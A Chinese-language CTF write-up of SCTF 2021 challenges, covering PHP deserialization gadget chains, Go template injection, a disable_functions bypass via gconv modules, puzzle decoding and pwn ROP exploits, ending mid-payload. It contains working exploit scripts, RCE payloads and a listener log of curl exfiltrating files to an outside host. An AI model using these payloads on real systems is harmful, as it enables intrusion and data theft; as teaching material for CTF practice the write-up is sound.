@@ -1,0 +1,2388 @@
+# SCTF 2021 Writeup by Dest0g3
+
+阅读量 **338410**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-12-30 16:30:46
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01844ee8c754dda0d5.jpg)
+
+## Web
+
+###  Loginme
+
+上来说要用localhost
+
+直接搞403了，附件给了源码
+
+middleware.go：
+
+![](https://p4.ssl.qhimg.com/t015104859e2852e479.jpg)
+
+x-forwarded-for 和 x-client-ip 都被ban了，用 x-real-ip
+
+    
+    
+    x-real-ip: 127.0.0.1
+    
+
+?id=0 到这儿
+
+![](https://p2.ssl.qhimg.com/t01c6508ee7d02dfeaa.jpg)
+
+GET 随便传 age ，传什么反什么，考虑ssti
+
+试了一下go最简单的ssti
+
+    
+    
+    ?id=0&age={{.Password}}
+    
+
+![](https://p3.ssl.qhimg.com/t01c133cf215250b6ee.jpg)
+
+###  Upload_it
+
+任意上传文件：
+
+    
+    
+    <?php
+    include_once "../vendor/autoload.php";
+    
+    error_reporting(0);
+    session_start();
+    
+    define("UPLOAD_PATH", "/tmp/sandbox");
+    if (!file_exists(UPLOAD_PATH)) {
+        @mkdir(UPLOAD_PATH);
+    }
+    
+    function make_user_upload_dir() {
+        $md5_dir = md5($_SERVER['REMOTE_ADDR'] . session_id());
+        $upload_path = UPLOAD_PATH . "/" . $md5_dir;
+        @mkdir($upload_path);
+        $_SESSION["upload_path"] = $upload_path;
+    }
+    
+    if (empty($_SESSION["upload_path"])) {
+        make_user_upload_dir();
+    }
+    
+    if (!empty($_FILES['file'])) {
+        $file = $_FILES['file'];
+        if ($file['size'] < 1024 * 1024) {
+            if (!empty($_POST['path'])) {
+                $upload_file_path = $_SESSION["upload_path"]."/".$_POST['path'];
+                $upload_file = $upload_file_path."/".$file['name'];
+            } else {
+                $upload_file_path = $_SESSION["upload_path"];
+                $upload_file = $_SESSION["upload_path"]."/".$file['name'];
+            }
+    
+            if (move_uploaded_file($file['tmp_name'], $upload_file)) {
+                echo "OK! Your file saved in: " . $upload_file;
+            } else {
+                echo "emm...Upload failed:(";
+            }
+        } else {
+            echo "too big!!!";
+        }
+    } else if (!empty($_GET['phpinfo'])) {
+        phpinfo();
+        exit();
+    } else {
+        echo <<<CODE
+    <html>
+        <head>
+            <title>Upload</title>
+        </head>
+    
+        <body>
+            <h1>Upload files casually XD</h1>
+            <form action="index.php" method="post" enctype="multipart/form-data">
+                FILE: <input type="file" name="file">
+                PATH: <input type="text" name="path">
+                <input type="submit">
+            </form>
+    
+            <hr>
+    
+            <h3>or...Just look at the phpinfo?</h3>
+            <a href="./index.php?phpinfo=1">go to phpinfo</a>
+        </body>
+    </html>
+    CODE;
+    }
+    
+
+发现给了`composer.json`，拿`composer`把`vendor`下载下来，是`opis`和`symfony`：
+
+![](https://p1.ssl.qhimg.com/t0102ff1be21c367e34.png)
+
+查了一下发现thinkphp的反序列化里面也用到了，利用的是`\Opis\Closure\SerializableClosure`：
+
+![](https://p5.ssl.qhimg.com/t01d99db41c8adc8f35.png)
+
+它的`__invoke`：
+
+![](https://p0.ssl.qhimg.com/t01dceb3c6a7af8980d.png)
+
+所以可以想办法利用这里，继续往前找可以触发`__invoke`的点，发现了`LazyString`的`__toString`：
+
+![](https://p1.ssl.qhimg.com/t01c1cc5e7c1b8d7faa.png)
+
+想办法触发`__toString`即可。
+
+发现index.php的这里：
+
+    
+    
+    $upload_file_path = $_SESSION["upload_path"]."/".$_POST['path'];
+    
+
+上传session控制`$_SESSION`即可。
+
+POC：
+
+    
+    
+    <?php
+    namespace Symfony\Component\String{
+    
+        use Opis\Closure\SerializableClosure;
+    
+        class LazyString{
+            private $value;
+            public function __construct(){
+                $func =function (){
+                    eval($_GET['feng']);
+                };
+                $this->value = new \Opis\Closure\SerializableClosure($func);
+            }
+        }
+    }
+    namespace {
+        include_once "./vendor/autoload.php";
+        session_start();
+    
+        use Symfony\Component\String\LazyString;
+    
+        $a= new LazyString();
+        $_SESSION["upload_path"] = $a;
+    }
+    
+
+在本地找到session文件：
+
+![](https://p0.ssl.qhimg.com/t01a1cd6f99327f5cd6.png)
+
+把它上传到`tmp`目录下面：
+
+![](https://p4.ssl.qhimg.com/t01371fcc1d58307416.png)
+
+（不这样也行，把所有属性都改成`public`）
+
+然后PHPSESSID改成`cm19qh3da8eo1thluucm1hlqkf`后再上传文件即可触发：
+
+![](https://p0.ssl.qhimg.com/t01ac27844f7f8eeef0.png)
+
+但实际上好像不是这样的。。。好像触发点是`__sleep`？`ezosu`也是这样。
+
+###  ezosu
+
+一个imiphp的题：
+
+    
+    
+    <?php
+    
+    namespace ImiApp\ApiServer\Controller;
+    
+    use Imi\App;
+    use Imi\Db\Db;
+    use Imi\Redis\Redis;
+    use Imi\Server\Http\Controller\HttpController;
+    use Imi\Server\Http\Route\Annotation\Action;
+    use Imi\Server\Http\Route\Annotation\Controller;
+    use Imi\Server\Http\Route\Annotation\Route;
+    use Imi\Server\View\Annotation\HtmlView;
+    use Imi\Server\View\Annotation\View;
+    use Imi\Server\Session\Session;
+    
+    /**
+     * @Controller("/")
+     */
+    class IndexController extends HttpController
+    {
+        /**
+         * @Action
+         * @Route("/")
+         *
+         * @return array
+         */
+        public function index()
+        {
+            return $this->response->redirect("/index.html");
+        }
+    
+        /**
+         * @Action
+         * 
+         * @return array
+         */
+        public function config()
+        {
+            $method = $this->request->getMethod();
+            $res = [
+                "msg" => "ok",
+                "status" => "200",
+                "value" => true
+            ];
+    
+            if ($method === "POST") {
+                Session::clear();
+                $configData = $this->request->getParsedBody();
+                foreach ($configData as $k => $v) {
+                    Session::set($k, $v);
+                }
+            } else if ($method === "GET") {
+                $configData = Session::get();
+                if ($configData != null) {
+                    $res["value"] = $configData;
+                } else {
+                    $res = [
+                        "msg" => "Not Find",
+                        "status" => "404",
+                        "value" => null
+                    ];
+                }
+            } else {
+                $res = [
+                    "msg" => "Unsupported method",
+                    "status" => "405",
+                    "value" => false
+                ];
+            }
+            return $res;
+        }
+    }
+    
+
+可以自定义session。把题目环境的文件和imi官方的文件进行比对了一下，发现多了这么一行东西：
+
+![](https://p3.ssl.qhimg.com/t010a6f6260850cd7ad.png)
+
+尝试进行恶意的session注入：
+
+![](https://p2.ssl.qhimg.com/t015b1975afedec4ba8.png)
+
+所以就是找imi的链子了（但是没找到）。。。。
+
+找到的是被`__wakeup`的，后面一部分包含了`__toString`。
+
+比赛的时候盲猜会不会`SESSION`对象在imi中有什么处理然后触发`__toString`，试了一下过了成功触发了。。。
+
+直接看POC就知道了，最后的RCE点：
+
+![](https://p1.ssl.qhimg.com/t019d322635d3798296.png)
+
+考虑到php7.4而且没回显而且写进session时候有些字符还会出问题，想到了`create_function`注入。
+
+POC：
+
+    
+    
+    <?php
+    
+    
+    namespace Symfony\Component\String{
+    
+        use PhpOption\LazyOption;
+    
+        class LazyString{
+            public $value;
+            public function __construct(){
+                $a = new LazyOption();
+                $this->value =[$a,'getIterator'];
+            }
+        }
+    }
+    namespace PhpOption{
+        final class LazyOption{
+            public $option = null;
+            public $callback = 'create_function';
+            public $arguments = ['',"}system(base64_decode('xxx'));//"];
+        }
+    }
+    namespace {
+    
+    
+        use Symfony\Component\String\LazyString;
+    
+        session_start();
+        $_SESSION['feng'] = new LazyString();
+    }
+    
+
+然后填进去：
+
+![](https://p4.ssl.qhimg.com/t01bcec97cc25554d80.png)
+
+2次即可触发。然后curl外带出来flag就行了。
+
+    
+    
+    root@VM-0-6-ubuntu:~# nc -lvvp 39767
+    Listening on [0.0.0.0] (family 0, port 39767)
+    Connection from ecs-124-70-204-21.compute.hwclouds-dns.com 56688 received!
+    POST / HTTP/1.1
+    Host: 121.5.169.223:39767
+    User-Agent: curl/7.76.1
+    Accept: */*
+    Content-Length: 2034
+    Content-Type: multipart/form-data; boundary=------------------------484cb7eb09ce5048
+    
+    --------------------------484cb7eb09ce5048
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+    Content-Type: text/plain
+    
+    /usr/local/lib/php/build/ax_check_compile_flag.m4
+    /proc/sys/kernel/acpi_video_flags
+    /proc/kpageflags
+    /etc/where_is_my_flag
+    /etc/where_is_my_flag/flag
+    /sys/devices/pnp0/00:04/tty/ttyS0/flags
+    /sys/devices/platform/serial8250/tty/ttyS15/flags
+    /sys/devices/platform/serial8250/tty/ttyS6/flags
+    /sys/devices/platform/serial8250/tty/ttyS23/flags
+    /sys/devices/platform/serial8250/tty/ttyS13/flags
+    /sys/devices/platform/serial8250/tty/ttyS31/flags
+    /sys/devices/platform/serial8250/tty/ttyS4/flags
+    /sys/devices/platform/serial8250/tty/ttyS21/flags
+    /sys/devices/platform/serial8250/tty/ttyS11/flags
+    /sys/devices/platform/serial8250/tty/ttyS2/flags
+    /sys/devices/platform/serial8250/tty/ttyS28/flags
+    /sys/devices/platform/serial8250/tty/ttyS18/flags
+    /sys/devices/platform/serial8250/tty/ttyS9/flags
+    /sys/devices/platform/serial8250/tty/ttyS26/flags
+    /sys/devices/platform/serial8250/tty/ttyS16/flags
+    /sys/devices/platform/serial8250/tty/ttyS7/flags
+    /sys/devices/platform/serial8250/tty/ttyS24/flags
+    /sys/devices/platform/serial8250/tty/ttyS14/flags
+    /sys/devices/platform/serial8250/tty/ttyS5/flags
+    /sys/devices/platform/serial8250/tty/ttyS22/flags
+    /sys/devices/platform/serial8250/tty/ttyS12/flags
+    /sys/devices/platform/serial8250/tty/ttyS30/flags
+    /sys/devices/platform/serial8250/tty/ttyS3/flags
+    /sys/devices/platform/serial8250/tty/ttyS20/flags
+    /sys/devices/platform/serial8250/tty/ttyS10/flags
+    /sys/devices/platform/serial8250/tty/ttyS29/flags
+    /sys/devices/platform/serial8250/tty/ttyS1/flags
+    /sys/devices/platform/serial8250/tty/ttyS19/flags
+    /sys/devices/platform/serial8250/tty/ttyS27/flags
+    /sys/devices/platform/serial8250/tty/ttyS17/flags
+    /sys/devices/platform/serial8250/tty/ttyS8/flags
+    /sys/devices/platform/serial8250/tty/ttyS25/flags
+    /sys/devices/virtual/net/eth0/flags
+    /sys/devices/virtual/net/lo/flags
+    /sys/module/scsi_mod/parameters/default_dev_flags
+    
+    --------------------------484cb7eb09ce5048--    ^C
+    root@VM-0-6-ubuntu:~# nc -lvvp 39767
+    Listening on [0.0.0.0] (family 0, port 39767)
+    Connection from ecs-124-70-204-21.compute.hwclouds-dns.com 56698 received!
+    POST / HTTP/1.1
+    Host: 121.5.169.223:39767
+    User-Agent: curl/7.76.1
+    Accept: */*
+    Content-Length: 240
+    Content-Type: multipart/form-data; boundary=------------------------8ea4f0b370455f5a
+    
+    --------------------------8ea4f0b370455f5a
+    Content-Disposition: form-data; name="file"; filename="flag"
+    Content-Type: application/octet-stream
+    
+    SCTF{Wow_unS@f3_S3sSi0N_w0w_sL33P_Cha1n_woW}
+    --------------------------8ea4f0b370455f5a--    ^C
+    
+
+看着`flag`知道这是一个`sleep chain`。。。赛后和别的师傅交流了一下才知道原来会进行`serialize`（是我菜了）：
+
+![](https://p1.ssl.qhimg.com/t011a0d4fe611b36d24.png)
+
+![](https://p3.ssl.qhimg.com/t01c728782abc33dc94.png)
+
+触发`__toString`。
+
+###  upload it 2
+
+基本没咋改，只是多了沙盒类：
+
+    
+    
+    // emmm...easy backdoor
+    class sandbox {
+        private $evil;
+        public $upload_path;
+    
+        public function make_user_upload_dir() {
+            $md5_dir = md5($_SERVER['REMOTE_ADDR'] . session_id());
+            $this->upload_path = UPLOAD_PATH . "/" . $md5_dir;
+            @mkdir($this->upload_path);
+            $_SESSION["upload_path"] = $this->upload_path;
+        }
+    
+        public function has_upload_dir() {
+            return !empty($_SESSION["upload_path"]);
+        }
+    
+        public function __wakeup() {
+            /*
+            I removed this code because it was too dangerous.
+            */
+            throw new Error("NO NO NO");
+        }
+    
+        public function __destruct() {
+            /*
+            I removed this code because it was too dangerous.
+            */
+        }
+    
+        public function __call($func, $value) {
+            if (method_exists($this, $func)) {
+                call_user_func_array(
+                    [$this, $func],
+                    $value
+                );
+            }
+        }
+    
+        private function backdoor() {
+            // __destruct and __wakeup are deleted. It looks like backdoor should not be called.
+            include_once $this->evil;
+        }
+    }
+    
+
+调用`backdoor`包含`/flag`就行了，POC：
+
+    
+    
+    <?php
+    
+    namespace Symfony\Component\String{
+        class LazyString{
+            public $value;
+            public function __construct(){
+                $a = new \sandbox();
+                $this->value = [$a,'backdoor'];
+            }
+        }
+    }
+    namespace {
+    
+        use Symfony\Component\String\LazyString;
+    
+        class sandbox {
+            public $evil;
+            public function __construct(){
+                $this->evil = "/flag";
+            }
+        }
+    
+        session_start();
+        $a= new LazyString();
+        $_SESSION["upload_path"] = $a;
+    }
+    
+
+按`Upload_it`的思路打就行了。`__wakeup`不影响。跟0CTF那个原理应该一样。
+
+![](https://p1.ssl.qhimg.com/t0169051d707182c569.png)
+
+###  FUMO_on_the_Christmas_tree
+
+<https://www.freebuf.com/articles/web/279680.html>
+
+    
+    
+    <?php
+    namespace christmasTree {
+        class DHYrAh {
+        }
+        class y3ViK8G {
+        public object $Wr7Ytn9Ia;//Q9sNNb
+    }
+    class Q9sNNb {
+        public object $Ow2G2ch9;//NZUgPW
+        public object $TOOTyKhmC1;
+    }
+    class NZUgPW {
+        public object $Kt92sqw;
+        public object $E4N2iF;//P2pLyUi
+    }
+    class P2pLyUi {
+        public object $VDmyPU4o;
+        public object $CiBLGI;//Som7A0BEFb
+    }
+    class Som7A0BEFb {
+        public object $vqZ2HyiFB;//yu1riFpaOC
+        public object $DaCZAkYXaN;
+    
+    }
+    class yu1riFpaOC {
+        public object $rz4YgswK;
+        public object $hrtyBmKl;//zQYZ26GWX
+    }
+    class zQYZ26GWX {
+        public object $l9c7yu9g;//b0tqYdgr2G
+        public object $VFkIed9F7N;
+    }
+    class b0tqYdgr2G {
+        public object $ooYbyPK;//R5u4RGrwc
+        public object $ubRaqm;
+    }
+    class R5u4RGrwc {
+        public object $Lcg4K2oI;//EppdCTV9
+        public object $AKlIuF;
+    }
+    class UZwUkGPf {
+        public object $osDZXTq6;
+        public object $Z1gxpfyn;//qZ6Ugl
+    }
+    class qZ6Ugl {
+        public object $APKniMr;//Cwq0C0el
+    }
+    class Cwq0C0el {
+        public object $GF6ZDaU;//oRGGlSftU
+    }
+    // /fumo/../../../../../../../etc/passwd
+    class oRGGlSftU {
+    }
+        $a = new y3ViK8G();
+        $b = new Q9sNNb();
+        $c = new NZUgPW();
+        $d = new P2pLyUi();
+        $e = new Som7A0BEFb();
+        $f =new yu1riFpaOC();
+        $g = new zQYZ26GWX();
+        $h = new b0tqYdgr2G();
+        $i = new R5u4RGrwc();
+        $j =new UZwUkGPf();
+        $k = new qZ6Ugl();
+        $l = new Cwq0C0el();
+        $m = new oRGGlSftU();
+    
+        $a->Wr7Ytn9Ia=$b;
+        $b->Ow2G2ch9=$c;
+        $b->TOOTyKhmC1=new DHYrAh();
+        $c->E4N2iF=$d;
+        $c->Kt92sqw=new DHYrAh();
+        $d->CiBLGI=$e;
+        $d->VDmyPU4o=new DHYrAh();
+        $e->vqZ2HyiFB=$f;
+        $e->DaCZAkYXaN=new DHYrAh();
+        $f->hrtyBmKl=$g;
+        $f->rz4YgswK=new DHYrAh();
+        $g->l9c7yu9g=$h;
+        $g->VFkIed9F7N=new DHYrAh();
+        $h->ooYbyPK=$i;
+        $h->ubRaqm=new DHYrAh();
+        $i->Lcg4K2oI=$j;
+        $i->AKlIuF=new DHYrAh();
+        $j->Z1gxpfyn=$k;
+        $j->osDZXTq6=new DHYrAh();
+        $k->APKniMr=$l;
+        $l->GF6ZDaU=$m;
+    
+        $obj = serialize($a);
+        echo $obj;
+    }
+    
+
+![](https://p2.ssl.qhimg.com/t015023cddf16b0c89d.png)
+
+###  rceme
+
+和2020的极客一样，只不过set了df。看了一下就知道是和qwnt的那个一模一样。主要是执行代码就可以了。
+
+    
+    
+    # -*- coding: utf-8 -*
+    # /usr/bin/python3
+    # @Author:Firebasky
+    exp = ""
+    def urlbm(s):
+        ss = ""
+        for each in s:
+            ss += "%" + str(hex(255 - ord(each)))[2:]
+        return f"[~{ss}][!%FF]("
+    while True:
+        fun = input("Firebasky>: ").strip(")").split("(")
+        exp = ''
+        for each in fun[:-1]:
+            exp += urlbm(each)
+            print(exp)
+        exp += ")" * (len(fun) - 1) + ";"
+        print(exp)
+        #call_user_func(...unserialize(end(getallheaders())));
+    
+
+发现php中调用函数的时候传递数组可以所以 **…** 最重要的是如何控制一个数组。hzx
+拉了个屎就想到了。然后执行代码可以使用create_function去使用。
+
+    
+    
+    [~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));
+    
+
+如下脚本
+
+    
+    
+    <?php
+    //$a=array("create_function","",'2;}$dir=new DirectoryIterator("/tmp/");foreach($dir as $f){echo($f."");} ;/*');
+    # /tmp/payload.so
+    $b =array("create_function","",'2;}$file=new SplFileObject("/tmp/gconv-modules", "w");$written=$file->fwrite($_POST[1]);/*');
+    $c =array("create_function","",'2;};putenv("GCONV_PATH=/tmp/");highlight_file("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");/*');
+    echo serialize($c);
+    # putenv("GCONV_PATH=/tmp/");highlight_file('php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/payload.so');
+    //$a='a:3:{i:0;s:15:"create_function";i:1;s:0:"";i:2;s:15:"2;}phpinfo();/*";}';
+    //$b=unserialize($a);
+    //echo gettype($b);
+    //call_user_func(...$b);
+    
+
+写进去gconv-modules和payload.so
+
+    
+    
+    module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
+    module  INTERNAL   PAYLOAD//    ../../../../../../../../tmp/payload    2
+    
+
+触发
+
+    
+    
+    POST / HTTP/1.1
+    Host: 124.70.199.17:8001
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 570
+    cmd:a:3:{i:0;s:15:"create_function";i:1;s:0:"";i:2;s:122:"2;};putenv("GCONV_PATH=/tmp/");highlight_file("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");/*";}
+    
+    cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&1=%6d%6f%64%75%6c%65%20%20%45%58%50%2f%2f%20%20%20%20%49%4e%54%45%52%4e%41%4c%20%20%20%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%65%78%70%20%20%20%20%32%0a%6d%6f%64%75%6c%65%20%20%49%4e%54%45%52%4e%41%4c%20%20%20%45%58%50%2f%2f%20%20%20%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%65%78%70%20%20%20%20%32
+    
+
+读文件。
+
+![](https://p3.ssl.qhimg.com/t0182b2a26d3bdaf8b7.png)
+
+其实前面就一个unser去控制一个数组执行任意代码,后面的bypass df和qwnt 一样。。。
+
+## MISC
+
+###  This_is_A_tree
+
+我先是自己列了一个树状图：
+
+![](https://p2.ssl.qhimg.com/t0114f81ea7fa01ca53.png)
+
+因为是有tree的提示，所以就按照前序/中序/后序这些试一试：
+
+中序密文：
+
+    
+    
+    Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==
+    
+
+base64解密后：
+
+    
+    
+    Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫
+    
+
+易经的编码我在BJDCTF2020 见到过：
+
+    
+    
+    https://blog.csdn.net/weixin_44110537/article/details/107494966
+    
+
+因此改一下脚本：
+
+    
+    
+    s = '师兑复损巽震晋姤大过讼噬嗑震恒节豫'
+    dic = {
+        '坤': '000000',
+        '剥': '000001',
+        '比': '000010',
+        '观': '000011',
+        '豫': '000100',
+        '晋': '000101',
+        '萃': '000110',
+        '否': '000111',
+        '谦': '001000',
+        '艮': '001001',
+        '蹇': '001010',
+        '渐': '001011',
+        '小过': '001100',
+        '旅': '001101',
+        '咸': '001110',
+        '遁': '001111',
+        '师': '010000',
+        '蒙': '010001',
+        '坎': '010010',
+        '涣': '010011',
+        '解': '010100',
+        '未济': '010101',
+        '困': '010110',
+        '讼': '010111',
+        '升': '011000',
+        '蛊': '011001',
+        '井': '011010',
+        '巽': '011011',
+        '恒': '011100',
+        '鼎': '011101',
+        '大过': '011110',
+        '姤': '011111',
+        '复': '100000',
+        '颐': '100001',
+        '屯': '100010',
+        '益': '100011',
+        '震': '100100',
+        '噬嗑': '100101',
+        '随': '100110',
+        '无妄': '100111',
+        '明夷': '101000',
+        '贲': '101001',
+        '既济': '101010',
+        '家人': '101011',
+        '丰': '101100',
+        '离': '101101',
+        '革': '101110',
+        '同人': '101111',
+        '临': '110000',
+        '损': '110001',
+        '节': '110010',
+        '中孚': '110011',
+        '归妹': '110100',
+        '睽': '110101',
+        '兑': '110110',
+        '履': '110111',
+        '泰': '111000',
+        '大畜': '111001',
+        '需': '111010',
+        '小畜': '111011',
+        '大壮': '111100',
+        '大有': '111101',
+        '夬': '111110',
+        '乾': '111111'
+    }
+    li = []
+    k = 0
+    for i in range(len(s)):
+        if k == 1:
+            k = 0
+            continue
+        try:
+            li.append(dic[s[i]])
+        except:
+            t = ''
+            t = t + s[i] + s[i + 1]
+            li.append(dic[t])
+            k = 1
+    ss = ''.join(li)
+    print(ss)
+    print('----------------')
+    enc = ''
+    for i in range(0, len(ss), 8):
+        enc += chr(eval('0b' + ss[i:i + 8]))
+    print(enc)
+    
+
+得到解密后的：
+
+![](https://p3.ssl.qhimg.com/t01e401eb3378f6b6e3.png)
+
+因此得到flag：
+
+    
+    
+    SCTF{Ch1nA_yyds!}
+    
+
+###  fumo_xor_cli
+
+nc过去打印很多字符，然后重定向保存到文件
+
+分析一下发现 有不少空格 所以按照`\n\n`分割，分割出
+
+![](https://p5.ssl.qhimg.com/t01d34643f1a663b260.png)
+
+57个文件，再通过脚本把颜色提取出来做成图片：
+
+    
+    
+    import re
+    from PIL import Image
+    
+    for k in range(57):
+        img = Image.new("RGB",(133,50))
+        f = open(f"{k}","r").read()
+        lines = f.split("\n")
+        for i in range(len(lines)):
+            rgbs = re.findall(r"38;2;(.*?);(.*?);(.*?)m",lines[i])
+            for j in range(len(rgbs)):
+                rgb = (int(rgbs[j][0]),int(rgbs[j][1]),int(rgbs[j][2]))
+                img.putpixel((j,i),rgb)
+        img.save(f"{k}.png")
+    
+
+看一遍之后发现序号为21和25的有些怪，所以单独拿出来
+
+再这些文件里边有一个weixin的链接点进去时fomo图，放大了看有很多小点点，把这些一个一个像素点提取出来成图片：
+
+![](https://p4.ssl.qhimg.com/t011bc1e34b18353d8f.png)
+
+脚本如下:
+
+    
+    
+    from PIL import Image
+    
+    img = Image.open("TpMSkq.png")
+    img_save = Image.new("RGB",(133,100))
+    width,hight = img.size
+    for i in range(1,width,9):
+        for j in range(1,hight,9):
+            rgb = img.getpixel((i,j))
+            try:
+                img_save.putpixel(((j-1)//9,(i-1)//9),rgb)
+            except:
+                continue
+    img_save.save("out.png")
+    
+
+提取出来跟另外两张图对比一下发现，很多点和其中一张是一样的，再对比一下发现偏移50和另一张也很相似，猜测得把两个拼起来再异或或者盲水印，但是图太小了盲水印肯定看不清所以应该是异或，得到
+
+![](https://p4.ssl.qhimg.com/t01dc96b0d9f1b983a7.png)
+
+翻转一下，得到flag
+
+![](https://p5.ssl.qhimg.com/t01cde49de2bfc992c2.png)
+
+###  in_the_vaporwaves
+
+用sonic visualiser打开
+
+![](https://p3.ssl.qhimg.com/t01f35c0c3143539479.png)
+
+选这个，发现有很多不对劲的：
+
+![](https://p5.ssl.qhimg.com/t012b6e7e41787e10ab.png)
+
+仔细一看是摩斯电码，一个一个记下来然后转码，好像我还记错了一个VAPORW[@UES](https://github.com/UES
+"@UES")猜测一下是蒸汽波改成VAPORW[@VES](https://github.com/VES "@VES")就对了
+
+SCTF{DES1R3_DRIVES_INT0_VAPORW[@VES](https://github.com/VES "@VES")}
+
+## Pwn
+
+###  dataleak
+
+盲区，先去审计一下代码。
+
+<https://github.com/DaveGamble/cJSON/issues/338>
+
+![](https://p2.ssl.qhimg.com/t01d265508992284937.png)
+
+![](https://p4.ssl.qhimg.com/t012eb2bde31120e267.png)
+
+![](https://p3.ssl.qhimg.com/t0144b67221e4279156.png)
+
+他有一段字符this is the data on server这段字符串在远端是一串数据
+
+题目要求是泄露数据
+
+远端程序在泄露这段数据之后，会继续问你要这段数据，如果匹配就会print flag
+
+通过审计上面的代码我们可以知道，可以利用/ _把字符串复制上去，那我们就利用_ /*来泄露
+
+要先泄露data1，然后data2，很好理解（连蒙带猜，试了不少）
+
+exp：
+
+    
+    
+    from pwn import *
+    
+    p = process('./cJSON_PWN')
+    p = remote('124.70.202.226', 2101)
+    context.log_level = 'debug'
+    pl = '"' + 'A'* 12 + '\\' # last rsi + 6
+    pl = '\n' * 4 + '"' + 'A'* 8 + '\\' # last rsi + 6
+    io.send(pl)
+    pl = '\n' * 12 + '"\\'
+    p.send(pl)
+    # 12 + 4 == 0x10
+    
+    data = p.recv(11)
+    print('data1: ' + str(data))
+    
+    
+    pl = 'abcde/*fghijkl' # last rsi + 6
+    #gdb.attach(p)
+    p.send(pl)
+    pl = '/*aaaaaaaaaaaa'
+    p.send(p)
+    data2 = p.recv(11)
+    print('data2: ' + str(data2))
+    
+    data = data + data2
+    print('data: ' + data)
+    p.sendline(data)
+    
+    p.interactive()
+    
+
+###  Gadget
+
+沙盒可以看出没有对架构进行判断
+
+用retfq将程序变成32位架构，完事调用open把文件流创起来，然后用retf回到64位，使用盲注的方式，这里我用的是这个地方，
+
+![](https://p5.ssl.qhimg.com/t018875f82759a36bd7.jpg)
+
+r13跟rax都可控，r13小于rax的话，程序死循环，反之程序直接down。
+
+大概就是这样，具体可以看exp，如果能看的进去的话…….
+
+    
+    
+    # -*- coding: utf-8 -*
+    from pwn import *
+    #context.log_level = 'debug'
+    context.arch = 'amd64'
+    #context.terminal = ['tmux','new-window']
+    
+    def pwn(p,num,flag_ord):
+    
+        fake_stack = 0x40D160 + 0x400
+        pop_rax_ret = 0x0000000000401001
+        pop_rdi_pop_ret = 0x401734
+        pop_rsi_pop_pop_ret = 0x0000000000401732
+        pop_rsp_pop_pop_pop_ret = 0x0000000000401730
+        pop_rcx_ret = 0x000000000040117b
+        pop_rbx_pop_pop_pop_ret = 0x403072
+        pop_r13_pop_pop_pop_ret=  0x000000000040288f
+        mov_sys = 0x401170 
+        int80_ret = 0x4011f3
+        retfq_addr = 0x4011ec
+        payload = "a" * 48
+        payload +=p64(fake_stack)
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(fake_stack)
+        payload +=p64(fake_stack)
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(fake_stack)
+        payload +=p64(fake_stack)
+        payload +=p64(mov_sys)
+        payload +=p64(pop_rsp_pop_pop_pop_ret)
+        payload +=p64(fake_stack-0x10)
+    
+        p.send(payload.ljust(0xc0,"\x00"))
+    
+        payload = "./flag".ljust(8,"\x00")
+        payload += p64(pop_rbx_pop_pop_pop_ret)
+        payload += p64(fake_stack)
+        payload += p64(0)*3
+        payload += p64(pop_rcx_ret)
+        payload += p64(0)
+        payload += p64(pop_rax_ret)
+        payload += p64(5)
+        payload += p64(retfq_addr)
+        payload += p32(int80_ret)
+        payload += p32(0)
+        payload += p64(0x23)
+        payload += p32(retfq_addr+1)
+        payload += p32(0x401002)
+        payload += p32(0x33)
+        payload += p64(pop_rax_ret)
+        payload += p64(0)
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(fake_stack+0x400)
+        payload +=p64(fake_stack+0x400)
+    
+        payload +=p64(mov_sys)
+        payload +=p64(pop_rsp_pop_pop_pop_ret)
+        payload +=p64(fake_stack+0x400-0x18)
+    
+        p.send(payload.ljust(0xc0,"\x00"))
+    
+    
+        payload =p64(pop_rsi_pop_pop_ret)
+        payload +=p64(0x40db30-num+1)+p64(fake_stack)*2
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(3)+p64(fake_stack)
+        payload +=p64(pop_rax_ret)
+        payload +=p64(0)
+        payload +=p64(0x401165)#---read
+        payload +=p64(0)
+    
+        payload +=p64(pop_rsi_pop_pop_ret)
+        payload +=p64(fake_stack+0x500)+p64(fake_stack)*2
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(0)+p64(fake_stack)
+        payload +=p64(pop_rax_ret)
+        payload +=p64(0)
+        payload +=p64(0x401195)#---read
+        payload +=p64(0)
+    
+        payload +=p64(pop_rsp_pop_pop_pop_ret)
